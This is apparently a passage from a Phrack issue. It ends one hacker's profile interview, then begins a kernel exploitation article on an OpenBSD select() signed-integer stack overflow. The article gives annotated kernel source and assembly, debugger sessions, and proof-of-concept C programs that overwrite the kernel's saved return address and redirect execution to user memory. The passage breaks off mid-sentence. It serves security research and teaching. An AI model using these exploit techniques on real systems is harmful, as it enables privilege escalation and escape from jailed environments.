          Foods: Indian, Thai, Korean, Greek, Japanese, Lean Pockets
        Alcohol: Helles, Redbull &amp; Vodka
          Music: Screeching Weasel, Fugazi, Stretch Armstrong,
                 Bad Religion, some electronic
         Movies: Big Lebowski, Office Space, Austin Powers, Memento, Pi
Books &amp; Authors: Sigh.. I wish I read more these days.
           Urls: Can&#039;t think of any...
         I like: Engaging conversation. Sincerity and conviction.
                 Solving difficult problems. Mr. Show. Gummi Bears.
      I dislike: Unwarranted arrogance. Unwarranted Gummi Bears.

|=---=[ Life in 3 sentences

I&#039;ve never been normal. I&#039;ve always felt a sense of purpose. I&#039;ve tried
to be generous.

|=---=[ Hacker Life

PHRACKSTAFF: You have found quite a lot of bugs in the past and developed
             exploit code for them. Some vulnerabilities required new
             creative exploitation concepts which were not known at that
             time. What drives you into Challenging the exploitation of
             complicated bugs and what methods do you use?  

Well, my motivations have definitely changed over time. I can come
up with several ancillary reasons that have driven me at different times
during my life, and they include both the selfish and the altruistic. But,
I think it really comes down to a compulsion to figure all this stuff
out.

As far as methods, I try to be somewhat systematic in my approach. I
budget a good portion of time for just reading through the program,
trying to get a feel for its architecture and the mindset and techniques
of its authors. This also seems to help prime my subconscious.

I like to start at the lower layers of a program or system and look for
any kind of potential unexpected behavior that could percolate upwards. I
will document each function and brainstorm any potential problems I see
with it. I will occasionally take a break from documentation, and do the
considerably more fun work of tracing back some of my theories to see if
they pan out.

As far as writing exploits, I generally just try to reduce or eliminate
the number of things that need to be guessed.

|=---=[ Passions | What makes you tick

I&#039;m definitely obsessed with computers. One of my original goals in
learning to program as a kid was to develop games, so I&#039;ve always been
kind of passively interested in that. I&#039;m also interested in artificial
intelligence.

I&#039;ve been doing Wing Chun kung fu for about two years now, and I find
that to be really rewarding.

I spend a decent bit of my time thinking. I like to read lay-person
oriented overviews of various academic disciplines. I&#039;d really like to
learn more about biology and neuroscience.

|=---=[ Which research have you done or which one gave you the most fun?

I think I&#039;ve had the most fun when collaborating with others.

|=---=[ Memorable Experiences

Hanging out with sygma, saad, wordsmith, shegget, and all my old irc
friends. Getting into trouble with colonwq. Long, not entirely coherent,
chats with rc.local. :&gt;

The weekend drinking/hacking/coding sessions at neon&#039;s place.
boilermakers. Romania. Coding with xaphan. Almost getting fired from my
university job for hacking Microsoft, and then getting let off the hook
when one of their security officers called my boss. Helping joey__ write
his first exploit, and then not understanding how it worked when he had
finished. Working on various stuff with JoC, cham, module, so1o, zorkeres,
binf, and the rest of the r9 guys.

Hanging out with Vacuum and RFP before leaving the US.

The time I spent living in Germany. Working with plaguez and Thomas, two
absurdly brilliant guys. Living with Howard and Sondee.. eating at the
Citta. CCC Camp - Meeting TESO, THC, and many others. linux deathmatch.

Watching people like duke and scut (and many others) get really good, and
hoping that I somehow helped.

Accidentally crashing gatekeeper.

Hanging out in the adm channel. The always interesting discussions with
str and anti. Racing with K2 to write exploits as Sun advisories came
out.

The Firewall-1 speech with Dug and Thomas.

Finally getting my degree.

My european tour with dice. HAL. Meeting silvio. Getting smashed in the
basement of a bar in Poland with the LSD guys. Chilling with Scrippie and
Dvorvak and the members of a Dutch death metal band.

Going to a rave in Miami with JJ and ending up in the keys the day before
a hurricane.

Watching my little brothers grow up.

Tag team coding/auditing with dice.

Working for cool people - Mike, Jim, Pat.

German/reversing lessons from Halvar.

sms&#039;s from srpnsrt.

Defcon - meeting digit, cheez, charise, zip, gobbles, i1l, cain, arakis,
caddis, ryan, riley, and so many others.

The fun times I&#039;ve had in Chicago. Greg&#039;s couch. OFP with Paul and
Sergey. The bachelor party with monti and MJ. Meeting the esteemed Sarlo.

|=---=[ What&#039;s your architecture of choice? OS of choice?

I tend to use what I&#039;m comfortable with or whatever seems appropriate at
the moment. The three machines that I use most of the time are currently
running XP, Linux, and OpenBSD.

|=---=[ Quotes

&quot;Jesus Christ John McDonald!&quot;

&quot;odd&quot;

&quot;So, basically, what you are saying is that we should try to find the
reactors.&quot;

&quot;Hey, I just work here...&quot;

|=---=[ Open Interview

Q: When did you start playing with computers?

I got a c64 when I was 6.

Q: When did you had your first contact to the &#039;scene&#039;?

1997 or so.

Q: When did you for your first time connect to the Internet?

1993. I had a part time job in high school programming for a satellite
research center that had Internet access. From what I recall, I mainly
played around on usenet and ftp sites.

Q: Let&#039;s talk a little bit about free research and Copyright. What&#039;s your
   opinion about &quot;Copyright on exploits&quot;?

Well, I&#039;m not a lawyer, and I haven&#039;t really looked into it. I think that
people should be entitled to do what they want with their work, and that
legal protections are there for a reason. However, I&#039;ve got no idea what
copyrighting an exploit will actually afford you legally.

Q: If you could turn the clock backward, what would you do different
   in your young life ?

That&#039;s a tough one. The Internet has suffered a fair bit for the sake of
my ego. I think I would have handled certain things with more discretion
if I&#039;d had a little more perspective.

|=---=[ One word comments

Give a one word comment to the following topics:

Digital Millennium Copyright Act (DMCA): oceanliner
KIMBLE (the wannabe-hacker)            : hoogedlyboogedly
ADM                                    : fun
NAI                                    : work
THE SCENE                              : which?
Companies buying exploits from hackers : dunno
IRC                                    : idle
CERT                                   : maligned
Full Disclosure Policy                 : careful

|=---=[ Would you work for the government/military? Why or why not?

As much as it suprises me to say it, I don&#039;t really have an ideological
opposition to working for my government. I think the combination of
getting a little bit older, spending some time living abroad, and the
recent events in my country has made me more appreciative of certain
things. I think it is safe to say I would do it if I believed I was doing
something positive and I thought it was necessary. Otherwise, I&#039;d avoid
it because it would just make life more complicated.

|=---=[ Please tell our audience a worst case scenario into what the scene
        might turn into.

I guess I could prognosticate about it becoming factionalized, petty,
cruel, insecure, and paranoid, but who would I be kidding?

|=---=[ And if everything works out fine? What&#039;s the best case scenario
        you can imagine?

As long as there is a place for new people who show promise, I think things
will be cool.

|=---=[ Any suggestions/comments/flames to the scene and/or specific people?

Think for yourself.

|=---=[ Shoutouts &amp; Greetings

Hi everyone :&gt;


|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x06 of 0x10

|=----------=[ Smashing The Kernel Stack For Fun And Profit ]=----------=|
|=----------------------------------------------------------------------=|
|=--------------=[ Sinan &quot;noir&quot; Eren &lt;noir@olympos.org&gt; ]=--------------=|


DISCLAIMER:
This article presented here is bound to no organization or company.  It is
the author&#039;s contrubition to the hacker community at large.  The research
and development in this article is done by the author with NO SUPPORT from
a commercial organization or company. No organization or company should be
held responsible or credited for this article other than the author
himself. 


--[ Contents

	1 - Introduction

	2 - The vulnerability: OpenBSD select() syscall overflow

	3 - Obstacles encountered in exploitation
	  3.1 - Overcoming the large copyin() problem
	    3.1.1 - mprotect() 4 life!
	  3.2 - Payload storage problem
	  3.3 - Return to user land problem

	4 - Crafting the exploit
	  4.1 - Breakpoints &amp; distance Calculation
	  4.2 - Return address overwrite &amp; execution redirection

	5 - How to gather offsets &amp; symbol addresses
	  5.1 - sysctl() syscall
	  5.2 - sidt technique &amp; _kernel_text search
	  5.3 - _db_lookup() technique	    
	  5.4 - /usr/bin/nm, kvm_open(), nlist()
	  5.5 - %ebp fixup	

	6 - Payload/shellcode creation
	  6.1 - What to achieve
	  6.2 - The payload
	    6.2.1 - p_cred &amp; u_cred
	    6.2.2 - chroot breaking
	    6.2.3 - securelevel
	  6.3 - Get root &amp; escape jail

	7 - Conclusions

	8 - Greetings

	9 - References

	10 - Code


--[ 1 - Introduction


This article is about recent exposures of many kernel level vulnerabilities
and advances in their exploitation which leads to trusted (oops safe) and
robust exploits.

We will focus on 2 recent vulnerabilities in the OpenBSD kernel as our case
studies. Out of the these we will mainly concentrate on exploitation of the
select() system call buffer overflow. The setitimer() arbitrary memory
overwrite vulnerability will be explained in the code section of this
article (as inline comments, so as not to repeat what we have already
covered whilst exploring the select() buffer overflow).

This paper should not be viewed as an exploit construction tutorial, my
goal is, rather, to explore and demonstrate generic ways to exploit stack
overflows and signed/unsigned vulnerabilities in kernel space.

Case studies will be used to demonstrate these techniques, and reusable
*BSD &quot;kernel level shellcodes&quot; -- with many cool features! -- will be
presented.

There has been related work done by [ESA] and [LSD-PL], which may
complement this article.


--[ 2 - The Vulnerability: OpenBSD select() syscall overflow


sys_select(p, v, retval)
        register struct proc *p;
        void *v;
        register_t *retval;
{
        register struct sys_select_args /* {
                syscallarg(int) nd;
                syscallarg(fd_set *) in;
                syscallarg(fd_set *) ou;
                syscallarg(fd_set *) ex;
                syscallarg(struct timeval *) tv;
        } */ *uap = v;
        fd_set bits[6], *pibits[3], *pobits[3];
        struct timeval atv;
        int s, ncoll, error = 0, timo;
        u_int ni;

[1]     if (SCARG(uap, nd) &gt; p-&gt;p_fd-&gt;fd_nfiles) {
                /* forgiving; slightly wrong */
                SCARG(uap, nd) = p-&gt;p_fd-&gt;fd_nfiles;
        }
[2]     ni = howmany(SCARG(uap, nd), NFDBITS) * sizeof(fd_mask);
[3]     if (SCARG(uap, nd) &gt; FD_SETSIZE) {

	...

	}
	...
#define getbits(name, x) \
[4]   if (SCARG(uap, name) &amp;&amp; (error = copyin((caddr_t)SCARG(uap, name), \
            (caddr_t)pibits[x], ni))) \
                goto done;
[5]     getbits(in, 0);
        getbits(ou, 1);
        getbits(ex, 2);
#undef  getbits

	...

To make some sense out of the code above we need to decipher the SCARG
macro, which is extensively used in the OpenBSD kernel syscall handling
routines.

Basically, SCARG() is a macro that retrieves the members of the &#039;struct
sys_XXX_args&#039; structures.

sys/systm.h:114
...
#if     BYTE_ORDER == BIG_ENDIAN
#define SCARG(p, k)     ((p)-&gt;k.be.datum)       /* get arg from args 
pointer */
#elif   BYTE_ORDER == LITTLE_ENDIAN
#define SCARG(p, k)     ((p)-&gt;k.le.datum)       /* get arg from args 
pointer */

sys/syscallarg.h:14
...
#define syscallarg(x)                                                   \
        union {                                                         \
                register_t pad;                                         \
                struct { x datum; } le;                                 \
                struct {                                                \
                        int8_t pad[ (sizeof (register_t) &lt; sizeof (x))  \
                                ? 0                                     \
                                : sizeof (register_t) - sizeof (x)];    \
                        x datum;                                        \
                } be;                                                   \
        }


Access to structure members is performed via SCARG() in order to preserve
alignment along CPU register size boundaries, so that memory accesses will
be faster and more efficient.

In order to make use of the SCARG() macro, the declarations need to be done
as follows (example for select() syscall arguments):

sys/syscallarg.h:404
...
struct sys_select_args {
[6]     syscallarg(int) nd;
        syscallarg(fd_set *) in;
        syscallarg(fd_set *) ou;
        syscallarg(fd_set *) ex;
        syscallarg(struct timeval *) tv;
};

The vulnerability can be described as an insufficient check on the &#039;nd&#039;
argument [6], which is used as the length parameter for userland to kernel
land copy operations.

Whilst there is a check [1] on the &#039;nd&#039; argument (nd represents the highest
numbered descriptor plus one, in any of the fd_sets), which is checked
against the p-&gt;p_fd-&gt;fd_nfiles (the number of open descriptors that the
process is holding), this check is inadequate -- &#039;nd&#039; is declared as signed
[6], so it can be negative, and therefore will pass the greater-than check
[1].

Then &#039;nd&#039; is put through a macro [2], in order to calculate an unsigned
integer, &#039;ni&#039;, which will eventually be used as the the length argument for
the copyin operation.

howmany() [2] is defined as follows (sys/param.h line 175):

#define howmany(x, y)   (((x)+((y)-1))/(y))

Expansion of line [2] will look like as follows:

sys/types.h:157, 169
#define NBBY    8               /* number of bits in a byte */

typedef int32_t fd_mask;
#define NFDBITS (sizeof(fd_mask) * NBBY)        /* bits per mask */
...
ni = ((nd + (NFDBITS-1)) / NFDBITS)  * sizeof(fd_mask);
ni = ((nd + (32 - 1)) / 32) * 4

Calculation of &#039;ni&#039; is followed by another check on the &#039;nd&#039; argument [3].
This check is also passed, since OpenBSD developers consistently forget
about the signedness checks on the &#039;nd&#039; argument. Check [3] was done to see
if the space allocated on the stack is sufficient for the following copyin
operations, and, if not, then sufficient heap space will be allocated.

Given the inadequacy of the signed check, we&#039;ll pass check [3] (&gt;
FD_SETSIZE), and will continue using stack space. This will make our life
much easier, given that stack overflows are much more trivially exploited
than heap overflows. (Hopefully, I&#039;ll write a follow-up paper that will
demonstrate kernel-land heap overflows in the future).

Finally, the getbits() [4,5] macro is defined and called in order to
retrieve user supplied fd_sets (readfds, writefds, exceptfds -- these
arrays contain the descriptors to be tested for &#039;ready for reading&#039;, ready
for writing&#039; or &#039;have an exceptional condition pending&#039;).

For exploitation purposes we don&#039;t really care about the layout of the
fd_sets -- they can be treated as any simple char buffer aiming to overflow
its boundaries and overwrite the saved ebp and saved eip.

With this simple test code, we can reproduce the overflow:

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;

int
main(void)
{
	char *buf;
	buf = (char *) malloc(1024);
	memset(buf, 0x41, 1024);
	select(0x80000000, (fd_set *) buf, NULL, NULL, NULL);
}
 
What happens is; system call number 93 (SYS_select) is dispatched to
handler sys_select() by the syscall() function, with all user land supplied
arguments bundled into a sys_select_args structure.

&#039;nd&#039;, being 0x80000000 (the smallest negative number for signed 32bit) has
gone through the size check [1] and, later, the howmany() macro [2]
calculates unsigned integer &#039;ni&#039; as 0x10000000. The getbits() macro [5] is
then called with the address of buf (user land, heap) which expands to the
copyin(buf, kernel_stack, 0x10000000) operation.

copyin() starts to copy the userland buffer to the kernel stack, a long at
a time (0x10000000/4 times). However, this copy operation won&#039;t ever fully
succeed, as the kernel will run out of per-process stack trying to copy
such a huge buffer from userland -- and will crash on an out of bounds
write operation.


--[ 3 - Obstacles encountered in exploitation


     - copyin(uaddr, kaddr, big_number) problem

First and the most obvious problem is to take control of the size argument
&#039;ni&#039; passed to the copyin operation, since this number is derived from the
user supplied &#039;nd&#039; argument which, must be negative, we&#039;ll never be able to
construct a reasonably &quot;big&quot; number. Actually the &quot;smallest&quot; positive
number we can construct is 0x10000000. As we have already find out that,
this number will cause us to hit the end of kernel stack and kernel will
panic. This is our first obstacle and we&#039;ll overcome it by exploring how
copyin() works in the following section.

      - payload storage problem

This is a typical problem for every type of exploit (user or kernel land).
Determining where the most appropriate place is to store the
payload/shellcode.  This problem is rather simple to overcome in kernel
land exploits and we&#039;ll talk about the proper solution. 

      - clean return to user land problem

Another problem arises after we overwrite the saved return address and gain
control, at that point we can be real imaginative on the payload, but we&#039;ll
run into the trouble of how to return back to user land and be able to
enjoy our newly altered kernel space! 


--[ 3.1 - Overcoming The Large copyin() Problem


To be able to solve this problem, we need to read through the copyin() and
trap() functions and understand their internals.

We shall start by understanding copyin() user to kernel copy primitive, my
comments will be inlined:

sys/arch/i386/i386/locore.s:955

ENTRY(copyin)
        pushl   %esi
        pushl   %edi

Save %esi, %edi .

        movl    _C_LABEL(curpcb),%eax

Move the current process control block address (_curpcb) into %eax .
_C_LABEL() is a simple macro that will add an underscore sign to the
beginning of the symbol name. See sys/arch/i386/include/asm.h:66

The process control block is a per-process kernel structure that holds the
current execution state of a process and differs based on machine
architecture. It consists of: stack pointer, program counter, general-
purpose registers, memory management registers and some other architecture
depended members such as per process LDT&#039;s (i386) and so on. The *BSD
kernel extends the PCB with software related entries, such as the
&quot;copyin/out fault recovery&quot; handler (pcb_onfault). Each process control
block is stored and referenced through the user structure. See
sys/user.h:61 and [4.4 BSD].

[1]    pushl   $0

Push a ZERO on the stack; this will make sense at the epilog or the
_copy_fault function, which has the matching &#039;popl&#039; instruction.

[2]    movl    $_C_LABEL(copy_fault),PCB_ONFAULT(%eax)

Move _copy_fault&#039;s entry address into the process control block&#039;s
pcb_onfault member. This simply installs a special fault handler for
&#039;protection&#039;, &#039;segment not present&#039; and &#039;alignment&#039; faults.  copyin()
installs its own fault handler, _copy_fault, we&#039;ll get back to this when
exploring the trap() code, since processor faults are handled there.

        movl    16(%esp),%esi
        movl    20(%esp),%edi
        movl    24(%esp),%eax

Move the incoming first, second and third arguments to %esi, %edi, %eax
respectively. %esi being the user land buffer, %edi the destination kernel
buffer and %eax the size.

    /*
     * We check that the end of the destination buffer is not past the end
     * of the user&#039;s address space.  If it&#039;s not, then we only need to
     * check that each page is readable, and the CPU will do that for us.
     */
        movl    %esi,%edx
        addl    %eax,%edx

This addition operation is to verify if the user land address plus the size
(%eax) is in legal user land address space. The user land address is moved
to %edx and then added to the size (ubuf + size), which will point to the
supposed end of the user land buffer.

        jc      _C_LABEL(copy_fault)

This is a smart check to see if previous addition operation has an integer
over-wrap issue. e.g: the user land address being 0x0ded and size being
0xffffffff -- this unsigned arithmetic operation will overlap and the
result is going to be 0x0dec. By design, the CPU will set the carry flag on
such condition and &#039;jc&#039; jump short on carry flag set instruction will take
us to _copy_fault function which do some clean up and return EFAULT .

        cmpl    $VM_MAXUSER_ADDRESS,%edx
        ja      _C_LABEL(copy_fault)

Followed by the range check: whether or not the user land address plus size
is in valid user land address space range. A comparison is done against the
VM_MAXUSER_ADDRESS constant, which is the end of the user land stack
(0xdfbfe000 through obsd 2.6-3.1). If the sum (%edx) is above
VM_MAXUSER_ADDRESS &#039;ja&#039; (jump above) instruction will make a short jump to
_copy_fault , eventually leading to the termination of the copy operation.

3:      /* bcopy(%esi, %edi, %eax); */
        cld

Clear the direction flag, DF = 0, means that the copy operation is going to
increment the index registers &#039;%esi and %edi&#039; .

        movl    %eax,%ecx
        shrl    $2,%ecx
        rep
        movsl

Do the copy operation long at a time, from %esi to %edi .

        movb    %al,%cl
        andb    $3,%cl
        rep
        movsb

Copy the remaining (size % 4) data, byte at a time.

        movl    _C_LABEL(curpcb),%edx
        popl    PCB_ONFAULT(%edx)

Move the current process control block address into %edx, and then pop the
first value on the stack into the pcb_onfault member (ZERO [1] pushed
earlier). This means, the special fault handler is cleared from the
process.

        popl    %edi
        popl    %esi

Restore the old values of %edi, %esi .

        xorl    %eax,%eax
        ret

Do a return with a return value of zero: Success .

ENTRY(copy_fault)

In the case of faults and failures in checks at copyin() this is where we
drop.

        movl    _C_LABEL(curpcb),%edx
        popl    PCB_ONFAULT(%edx)

Move the current process control block address into %edx and then pop the
first value on the stack into the pcb_onfault member (ZERO [1] pushed
earlier). This clears the special fault handler from the process.

        popl    %edi
        popl    %esi

Restore the old values of %edi, %esi .

        movl    $EFAULT,%eax
        ret

Do a return with a return value of EFAULT (14): Failure .

After this long exploration of the copyin() function we&#039;ll just take a
brief look at trap() and check how pcb_onfault is implemented. trap() is
the main interface to exception, fault and trap handling of the BSD kernel.

trap.h:51:#define    T_PROTFLT        4      /* protection fault */
trap.h:63:#define    T_SEGNPFLT      16      /* segment not present fault 
*/
trap.h:54:#define    T_ALIGNFLT       7      /* alignment fault */

sys/arch/i386/i386/trap.c:174
void
trap(frame)
        struct trapframe frame;
{
        register struct proc *p = curproc;
        int type = frame.tf_trapno;
...
        switch (type) {

...
line: 269

        case T_PROTFLT:
        case T_SEGNPFLT:
        case T_ALIGNFLT:
                /* Check for copyin/copyout fault. */
[1]             if (p &amp;&amp; p-&gt;p_addr) {
[2]                     pcb = &amp;p-&gt;p_addr-&gt;u_pcb;
[3]                     if (pcb-&gt;pcb_onfault != 0) {
                        copyfault:
[4]                             frame.tf_eip = (int)pcb-&gt;pcb_onfault;
                                return;
                        }
                }

...

Faults such as &#039;protection&#039;, &#039;segment not present&#039; and &#039;alignment&#039; are
handled all together, through a switch statement in trap() code. The
appropriate case for the mentioned faults in trap() , initially checks for
the existence of the process structure and the user structure [1] then
loads the process control block from the user structure [2], check if the
pcb_onfault is set [3] if its set, if so, the instruction pointer (%eip) of
the control block is overwritten with the value of this special fault
handler [4]. After the process is context switched and given the cpu, it
will start running from the new handler code in kernel space. In the case
of copyin() , execution will be redirected to _copy_fault . 

Armoured with all this knowledge, we can now provide a solution for the
&#039;big size copyin()&#039; problem.


--[ 3.1.1 - mprotect() 4 life!


x86 cpu memory operations such like trying to read from write only (-w-)
page or trying to write to a read only (r--) or no access (---) page and
some other combinations will throw out a protection fault which will be
handled by trap() code as shown above. 

This basic functionality will allow us to write as many bytes into kernel
space as we wish, no matter how big the size value actually is. As seen
above, the trap() code checks for pcb_onfault handler for protection faults
and redirects execution to it. In order to stop copying from user land to
kernel land, we will need to turn off the read protection bit of any
certain page following the overflow vector and achieve our goal.

-------------
|    rwx    | --&gt; Dynamically allocated PAGE_SIZEd 
|           |     user land memory
|           |
|xxxxxxxxxxx| --&gt; Overflow vector (fd_set array)
-------------     (saved %ebp, %eip overwrite values)
|    -w-    |
|           |
|           | --&gt; Dynamically allocated PAGE_SIZEd 
|           |     consecutive memory, PROT_WRITE
-------------

The way to control the overflow as described in the diagram is to allocate
2 PAGE_SIZEd memory chunks and fill the end of the first page with overflow
data (exploitation vector) and then turn off the read protection bit of the
following page. 

At this stage we also run into another problem (albeit rather simple to
overcome). PAGE_SIZE is 4096 in x86 and 4096 bytes of overflowed stack will
crash the kernel at an earlier stage (before we take control). 

Actually for this specific overflow saved %ebp and saved %eip is 192 and
196 bytes away from the overflowed buffer, respectively. So, what we&#039;ll do
is allocate 2 pages and pass the fd_set pointer as &#039;second_page - 200&#039;.
Then copyin() will start copying just 200 bytes before the end of the
readable page and will hit the non readable page right after. An expection
will be thrown and trap() will handle the fault as explained, &#039;protection
fault&#039; handler will check pcb_onfault and set the instruction pointer of
the current PCB to the address of the handler, in this case _copy_fault.
_copy_fault will return EFAULT. 

If we go back to the sys_select() code getbits() macro [4] will check for
the return value and will go to &#039;done&#039; label on any value other than
success (0). At this point sys_select() set the error code (errno) and
return to syscall() (syscall dispatcher).


Here is the test code to verify the mprotect technique:

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;unistd.h&gt;

int
main(void)
{
        char *buf;
	u_long pgsz = sysconf(_SC_PAGESIZE);

        buf = (char *) malloc(pgsz * 3);
	/* asking for 3 pages, just to be safe */
	if(!buf) { perror(&quot;malloc&quot;); exit(-1); }
        memset(buf, 0x41, pgsz*3); /* 0x41414141 ;) */

	buf = (char *) (((u_long) buf &amp; ~pgsz) + pgsz);
	/* actually, we&#039;r using the 2. and 3. pages*/

	if(mprotect((char *) ((u_long) buf + pgsz), (size_t) pgsz,
		PROT_WRITE) &lt; 0)
	{
		perror(&quot;mprotect&quot;); exit(-1);
	}
	/* we set the 3rd page as WRITE only, 
	 * anything other than READ is fine 
	 */
	
	select(0x80000000, (fd_set *) ((u_long) buf + pgsz - 200), NULL,
		NULL, NULL);
}

- The ddb&gt; kernel debugger

To be able to debug the kernel we will need to set up the ddb kernel
debugger. Type the following commands to make sure ddb is set and don&#039;t
forget that, you should have some sort of console access to be able to
debug the kernel. (Physical access, console cable or those funky network
console devices...)

bash-2.05a# sysctl -w ddb.panic=1
ddb.panic: 1 -&gt; 1
bash-2.05a# sysctl -w ddb.console=1
ddb.console: 1 -&gt; 1

The first sysctl command configures ddb to kick in on kernel panics. The
latter will set up ddb accessible from console at any given time, with the
ESC+CTRL+ALT key combination.

There is no way to explore kernel vulnerabilities without many panic()s
getting in the way, so lets get dirty.

bash-2.05a# gcc -o test2 test2.c 
bash-2.05a# sync
bash-2.05a# sync
bash-2.05a# uname -a
OpenBSD kernfu 3.1 GENERIC#59 i386
bash-2.05a# ./test2
uvm_fault(0xe4536c6c, 0x41414000, 0, 1) -&gt; e
kernel: page fault trap, code=0
Stopped at	0x41414141:uvm_fault(0xe4536c6c, 0x41414000, 0, 1) -&gt; e
...

ddb&gt; trace
...
_kdb_trap(6,0,e462af08,1) at _kdb_trap+0xc1
_trap() at _trap+0x1b0
--- trap (number 6) ---
0x41414141:
ddb&gt;

What all this means is that a page fault trap was taken from for address
0x41414141 and since this is an invalid address for kernel land, it was not
able to be paged in (such like every illegal address reference) which lead
to a panic(). This means we are on the right track and indeed overwrite the
%eip since the page 0x41414000 was attempted to loaded into memory.

Type following for a clean reboot.
ddb&gt; boot sync
....

Lets verify that we gain the control by overwriting the %eip - here is how
to set the appropriate breakpoints: 

Hit CTRL+ALT+ESC: 

ddb&gt; x/i _sys_select,130
_sys_select:	pushl	%ebp
_sys_select+0x1:	movl	%esp,%ebp
...
...
_sys_select+0x424:	leave
_sys_select+0x425:	ret
_sys_select+0x426:	nop
...
ddb&gt; break _sys_select+0x425
ddb&gt; cont
^M	--&gt; hit enter!
bash-2.05a# 

At this stage some other process might kick ddb&gt; in because of its use of
the select syscall, just type &#039;cont&#039; on the ddb&gt; prompt and hit CR.

bash-2.05a# ./test2 
...
ddb&gt; print $ebp
41414141
ddb&gt; x/i $eip
_sys_select+0x425:	ret
ddb&gt; x/x $esp
0xe461df3c:	41414141 --&gt; saved instruction pointer!
ddb&gt; boot sync
...


--[ 3.2 - Payload storage problem


The payload storage area for user land vulnerabilities is usually the
overflowed buffer itself (if it&#039;s big enough) or some known user controlled
other location such like environment variables, pre-overflow command
leftovers, etc, etc, in short, any user controlled memory that will stay
resident long enough to reference at a later time. Since the overflowed
buffer may be small in size, it is not always feasible to store the payload
there. Actually, for this specific buffer overflow, the contents of the
overflowed buffer get corrupted leaving us no chance to return to it. Also,
we will need enough room to execute code in kernel space to be able to do
complex tasks, such as resetting the chroot pointers, altering pcred, ucred
and securelevel and resolving where to return to ... for all these reasons
we are going to execute payload in the source buffer as opposed to the
destination (overflowed) buffer. This means we&#039;re going to jump to the user
land page, execute our payload and return back to our caller transparently.
This is all legitimate execution and we will have almost unlimited space to
execute our payload. In regards to the select() overflow: copyin(ubuf,
kbuf, big_num), we&#039;ll execute code inside &#039;ubuf&#039;.
 

--[ 3.3 - Return to user land problem


After we gain control and execute our payload, we need to clean things up
and start our journey to user land but this isn&#039;t as easy as it may sound.
My first approach was to do an &#039;iret&#039; (return from interrupt) in the
payload after altering all necessary kernel structures but this approach
turn out to be real painful. First of all, it&#039;s not an easy task to do all
the post-syscall handling done by syscall() function. Also, the trap() code
for kernel to user land transition can not be easily turn into payload
assembly code. However the most obvious reason, not to choose the &#039;iret&#039;
technique is that messing with important kernel primitives such as locks,
pending signals and/or mask-able interrupts is a really risky job thus
drastically reducing the reliability of exploits and increasing the
potential for post exploitation kernel panics. So I choose to stay out of
it! ;)

The solution was obvious, after payload execution we should return to the
point in syscall() handler where _sys_select() was supposed to return.
After that point, we don&#039;t need to care about any of the aforementioned
kernel primitives. This solution leads to the question of how to find out
where to return into since we have overwritten the return address to gain
control thus losing our caller&#039;s location. We will explorer many of the
possible solutions in section 5 and usage of the idtr register for kernel
land address gathering will be introduced on section 5.2 for some serious
fun!! Let&#039;s get going ...


--[ 4 - Crafting the exploit


In this section, setting up of proper breakpoints and how to calculate the
distance to the saved instruction pointer will be discussed. Also, a new
version of test code will be presented in order to demostrate that
execution can be successfully directed to the user land buffer.


--[ 4.1 - Breakpoints &amp; Distance Calculation


bash-2.05a# nm /bsd | grep _sys_select
e045f58c T _linux_sys_select
e01c5a3c T _sys_select
bash-2.05a# objdump -d --start-address=0xe01c5a3c --stop-
address=0xe01c5e63\
&gt;  /bsd | grep _copyin
e01c5b72:       e8 f9 a9 f3 ff          call   e0100570 &lt;_copyin&gt;
e01c5b9f:       e8 cc a9 f3 ff          call   e0100570 &lt;_copyin&gt;
e01c5bcc:       e8 9f a9 f3 ff          call   e0100570 &lt;_copyin&gt;
e01c5bf9:       e8 72 a9 f3 ff          call   e0100570 &lt;_copyin&gt;

The first copyin() is the one that copies the readfds and overflows the
kernel stack. That&#039;s the one we are after.

CTRL+ALT+ESC
bash-2.05a# Stopped at _Debugger+0x4: leave
ddb&gt; x/i 0xe01c5b72
_sys_select+0x136:	call	_copyin
ddb&gt; break _sys_select+0x136
ddb&gt; cont
^M
bash-2.05a# ./test2
Breakpoint at	_sys_select+0x136:	call	_copyin
ddb&gt; x/x $esp,3
0xe461de20:	5f38	e461de78	10000000

These are the 3 arguments pushed on the stack for copyin() ubuf: 0x5f38
kbuf: 0xe461de78 len:10000000

ddb&gt; x/x 0x5f38
0x5f38:	41414141
...
ddb&gt; x/x $ebp
0xe461df38:	e461dfa8	--&gt; saved %ebp
ddb&gt; ^M
0xe461df3c:	e02f34ce	--&gt; saved %eip 
ddb&gt;

In the x86 calling convention, 2 longs just before the base pointer are the
saved eip (return address) and the saved ebp, respectively. To calculate
the distance between the stack buffer and the saved eip in ddb is done as
follows:

ddb&gt; print 0xe461df3c - 0xe461de78
      c4 
ddb&gt; boot sync
...

The distance between the address of saved &quot;return address&quot; and the kernel
buffer is 196 (0xc4) bytes. Limiting our copyin() operation to 200 bytes
with the mprotect() technique will ensure a clean overflow.


4.2 - Return address overwrite &amp; execution redirection


At this stage I&#039;ll introduce another test code to &quot;verify&quot; execution
redirection and usability of the user land buffer for payload execution.

test3.c:

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;unistd.h&gt;

int
main(void)
{
        char *buf;
        long *lptr;
        u_long pgsz = sysconf(_SC_PAGESIZE);

        buf = (char *) malloc(pgsz * 3);
        if(!buf) { perror(&quot;malloc&quot;); exit(-1); }
        memset(buf, 0xcc, pgsz*3); /* int3 */

        buf = (char *) (((u_long) buf &amp; ~pgsz) + pgsz);

	if(mprotect((char *) ((u_long) buf + pgsz), (size_t) pgsz,
		PROT_WRITE) &lt; 0)
        {
		perror(&quot;mprotect&quot;); exit(-1);
	}


        lptr = (long *) ((u_long)buf + pgsz - 8);
        *lptr++ = 0xbaddcafe; /* saved %ebp, does not 
			       * matter at this stage
			       */
        *lptr++ = (long) buf; /* overwrite the return addr 
			       * with buf&#039;s addr
			       */
	select(0x80000000, (fd_set *) ((u_long) buf + pgsz - 200), NULL,
		NULL, NULL);
}
 

test3.c code will overwrite the saved ebp with 0xbaddcafe and the saved
instruction pointer with the address of the user land buffer, which is
filled with &#039;int 3&#039;&#039;s (debug interrupts). This code should kick in the
kernel debugger.

bash-2.05a# gcc -o test3 test3.c
bash-2.05a# ./test3
Stopped at	0x5001:	int	$3
ddb&gt; x/i $eip,2
0x5001:	int	$3
0x5002: int	$3
ddb&gt; print $ebp
baddcafe
ddb&gt; boot sync
...

Everything goes as planned, we successfully jump to user land and execute
